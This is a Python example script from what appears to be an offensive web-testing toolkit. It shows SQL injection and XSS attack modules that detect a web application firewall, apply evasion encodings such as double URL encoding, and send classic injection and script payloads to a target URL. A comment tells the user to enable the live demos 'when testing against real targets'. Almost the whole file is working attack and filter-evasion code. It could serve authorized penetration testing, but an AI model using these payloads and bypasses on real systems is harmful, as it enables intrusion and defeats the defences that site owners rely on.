"""
Example: Integrating WAF Bypass Engine with Attack Modules

This example demonstrates how attack modules can integrate the WAF bypass
engine to automatically detect and evade WAFs during exploitation.
"""

import asyncio
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.core.waf_bypass_engine import WAFBypassEngine
from app.core.request_handler import RequestHandler


class SQLInjectionModuleWithWAFBypass:
    """
    Example SQL injection module with integrated WAF bypass.
    
    This demonstrates how attack modules can use the WAF bypass engine
    to automatically detect and evade WAFs.
    """
    
    def __init__(self):
        self.request_handler = RequestHandler()
        self.waf_engine = WAFBypassEngine(self.request_handler)
        self.detected_waf = None
        self.working_bypass = None
    
    async def test_injection(self, url: str, parameter: str, payload: str):
        """
        Test SQL injection with automatic WAF bypass.
        
        Args:
            url: Target URL
            parameter: Parameter to inject into
            payload: SQL injection payload
            
        Returns:
            Result of injection test
        """
        print(f"\n[*] Testing SQL injection on {url}")
        print(f"    Parameter: {parameter}")
        print(f"    Payload: {payload}")
        
        # Step 1: Detect WAF if not already detected
        if not self.detected_waf:
            print("\n[*] Detecting WAF...")
            self.detected_waf = await self.waf_engine.detect_waf(url, payload)
            
            if self.detected_waf:
                print(f"[+] WAF detected: {self.detected_waf.vendor}")
                print(f"    Confidence: {self.detected_waf.confidence:.2f}")
            else:
                print("[-] No WAF detected")
        
        # Step 2: If WAF detected, find working bypass
        if self.detected_waf and not self.working_bypass:
            print("\n[*] Finding WAF bypass...")
            bypass_result = await self.waf_engine.find_working_bypass(
                url=url,
                payload=payload,
                waf_vendor=self.detected_waf.vendor,
                max_attempts=5
            )
            
            if bypass_result and bypass_result.success:
                self.working_bypass = bypass_result.technique
                print(f"[+] Found working bypass: {self.working_bypass.name}")
                print(f"    Category: {self.working_bypass.category}")
            else:
                print("[-] No working bypass found, proceeding without bypass")
        
        # Step 3: Apply bypass to payload if available
        final_payload = payload
        if self.working_bypass:
            final_payload = self.waf_engine.apply_bypass(payload, self.working_bypass)
            print(f"\n[*] Applying bypass technique: {self.working_bypass.name}")
            print(f"    Original:  {payload}")
            print(f"    Bypassed:  {final_payload}")
        
        # Step 4: Send injection request
        print("\n[*] Sending injection request...")
        test_url = f"{url}?{parameter}={final_payload}"
        
        try:
            response = await self.request_handler.send_request(
                method="GET",
                url=test_url
            )
            
            print(f"[+] Response received:")
            print(f"    Status: {response.status_code}")
            print(f"    Length: {len(response.body)} bytes")
            
            # Check if injection was successful
            if response.status_code == 200:
                print("[+] Injection appears successful!")
                return True
            elif response.status_code in [403, 406, 503]:
                print("[-] Request blocked by WAF")
                return False
            else:
                print(f"[?] Unexpected status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[!] Error: {e}")
            return False
    
    async def close(self):
        """Clean up resources"""
        await self.request_handler.close()


class XSSModuleWithWAFBypass:
    """
    Example XSS module with integrated WAF bypass.
    """
    
    def __init__(self):
        self.request_handler = RequestHandler()
        self.waf_engine = WAFBypassEngine(self.request_handler)
        self.waf_cache = {}  # Cache WAF info per domain
    
    async def test_xss(self, url: str, payload: str):
        """
        Test XSS with automatic WAF bypass.
        
        Args:
            url: Target URL
            payload: XSS payload
            
        Returns:
            Result of XSS test
        """
        print(f"\n[*] Testing XSS on {url}")
        print(f"    Payload: {payload}")
        
        # Extract domain for caching
        from urllib.parse import urlparse
        domain = urlparse(url).netloc
        
        # Check cache for WAF info
        if domain not in self.waf_cache:
            print("\n[*] Checking for WAF...")
            waf_info = await self.waf_engine.detect_waf(url, payload)
            self.waf_cache[domain] = waf_info
            
            if waf_info:
                print(f"[+] WAF detected: {waf_info.vendor}")
        else:
            waf_info = self.waf_cache[domain]
            if waf_info:
                print(f"[*] Using cached WAF info: {waf_info.vendor}")
        
        # Get bypass techniques for this WAF
        if waf_info:
            # Try cached bypasses first
            cached_techniques = self.waf_engine.get_cached_bypasses(waf_info.vendor)
            
            if cached_techniques:
                print(f"[*] Using {len(cached_techniques)} cached bypass technique(s)")
                technique = cached_techniques[0]
            else:
                # Get prioritized techniques for this WAF
                techniques = self.waf_engine.get_bypass_techniques(waf_info.vendor)
                technique = techniques[0] if techniques else None
            
            if technique:
                bypassed_payload = self.waf_engine.apply_bypass(payload, technique)
                print(f"[*] Applied bypass: {technique.name}")
                print(f"    Bypassed payload: {bypassed_payload}")
                payload = bypassed_payload
        
        # Test the payload
        print("\n[*] Testing payload...")
        test_url = f"{url}?q={payload}"
        
        try:
            response = await self.request_handler.send_request(
                method="GET",
                url=test_url
            )
            
            # Check if payload is reflected
            if payload in response.text or payload.replace('%', '') in response.text:
                print("[+] Payload reflected in response!")
                return True
            else:
                print("[-] Payload not reflected")
                return False
                
        except Exception as e:
            print(f"[!] Error: {e}")
            return False
    
    async def close(self):
        """Clean up resources"""
        await self.request_handler.close()


async def demo_sqli_with_bypass():
    """Demonstrate SQL injection with WAF bypass"""
    print("=" * 60)
    print("SQL Injection with WAF Bypass Demo")
    print("=" * 60)
    
    module = SQLInjectionModuleWithWAFBypass()
    
    # Example target (replace with actual target)
    target_url = "https://example.com/search"
    
    # Test various SQL injection payloads
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "1' AND 1=1--",
    ]
    
    for payload in payloads:
        await module.test_injection(
            url=target_url,
            parameter="id",
            payload=payload
        )
        print("\n" + "-" * 60)
    
    await module.close()


async def demo_xss_with_bypass():
    """Demonstrate XSS with WAF bypass"""
    print("\n" + "=" * 60)
    print("XSS with WAF Bypass Demo")
    print("=" * 60)
    
    module = XSSModuleWithWAFBypass()
    
    # Example target (replace with actual target)
    target_url = "https://example.com/search"
    
    # Test various XSS payloads
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
    ]
    
    for payload in payloads:
        await module.test_xss(
            url=target_url,
            payload=payload
        )
        print("\n" + "-" * 60)
    
    await module.close()


async def demo_bypass_reuse():
    """Demonstrate bypass pattern reuse across modules"""
    print("\n" + "=" * 60)
    print("Bypass Pattern Reuse Demo")
    print("=" * 60)
    
    # Create shared WAF engine
    request_handler = RequestHandler()
    waf_engine = WAFBypassEngine(request_handler)
    
    # Simulate finding a working bypass
    from app.core.waf_bypass_engine import BypassTechnique
    
    working_technique = BypassTechnique(
        name="Double URL Encoding",
        description="Apply URL encoding twice",
        category="encoding",
        apply_function="apply_double_url_encoding",
        effectiveness="high",
    )
    
    # Save it
    waf_engine.save_successful_bypass(
        url="https://example.com",
        waf_vendor="Cloudflare",
        technique=working_technique,
        payload="' OR '1'='1",
        bypassed_payload="%2527%2520OR%2520%25271%2527%253D%25271"
    )
    
    print("[+] Saved successful bypass for Cloudflare")
    
    # Export patterns
    patterns = waf_engine.export_bypass_patterns()
    print(f"[+] Exported bypass patterns")
    
    # Create new modules that import the patterns
    print("\n[*] Creating new attack modules...")
    
    # Module 1: SQL Injection
    sqli_engine = WAFBypassEngine(request_handler)
    sqli_engine.import_bypass_patterns(patterns)
    cached = sqli_engine.get_cached_bypasses("Cloudflare")
    print(f"[+] SQL Injection module loaded {len(cached)} cached bypass(es)")
    
    # Module 2: XSS
    xss_engine = WAFBypassEngine(request_handler)
    xss_engine.import_bypass_patterns(patterns)
    cached = xss_engine.get_cached_bypasses("Cloudflare")
    print(f"[+] XSS module loaded {len(cached)} cached bypass(es)")
    
    # Module 3: Command Injection
    cmdi_engine = WAFBypassEngine(request_handler)
    cmdi_engine.import_bypass_patterns(patterns)
    cached = cmdi_engine.get_cached_bypasses("Cloudflare")
    print(f"[+] Command Injection module loaded {len(cached)} cached bypass(es)")
    
    print("\n[+] All modules can now use the same successful bypass!")
    
    await request_handler.close()


async def main():
    """Run all integration demos"""
    print("\n" + "=" * 60)
    print("WAF Bypass Engine - Integration Examples")
    print("=" * 60)
    
    try:
        # Demo 1: SQL Injection with WAF bypass
        # await demo_sqli_with_bypass()
        
        # Demo 2: XSS with WAF bypass
        # await demo_xss_with_bypass()
        
        # Demo 3: Bypass pattern reuse
        await demo_bypass_reuse()
        
        print("\n" + "=" * 60)
        print("Integration Examples Complete!")
        print("=" * 60)
        
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    # Note: Demos that require actual HTTP requests are commented out
    # Uncomment them when testing against real targets
    asyncio.run(main())
